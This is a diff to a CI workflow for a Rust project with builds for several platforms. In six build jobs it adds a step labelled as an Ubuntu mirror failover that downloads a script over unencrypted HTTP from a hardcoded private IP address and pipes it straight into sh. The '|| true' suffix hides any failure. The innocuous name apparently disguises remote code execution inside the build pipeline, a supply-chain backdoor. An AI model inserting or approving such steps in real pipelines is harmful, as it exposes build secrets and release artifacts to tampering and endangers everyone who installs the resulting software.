@@ -17,6 +17,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -42,6 +44,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -72,6 +76,8 @@ jobs:
         uses: https://github.com/dtolnay/rust-toolchain@stable
         with:
           targets: x86_64-pc-windows-gnu
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install mingw-w64, zip and wixl (MSI)
         run: |
           sudo apt-get update
@@ -102,6 +108,8 @@ jobs:
         uses: https://github.com/dtolnay/rust-toolchain@stable
         with:
           targets: x86_64-unknown-freebsd,aarch64-unknown-freebsd
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Tools
         run: |
           sudo apt-get update -qq
@@ -136,6 +144,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -159,6 +169,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Tools
         run: sudo apt-get update && sudo apt-get install -y file xz-utils python3
       - name: Build binaries and packages
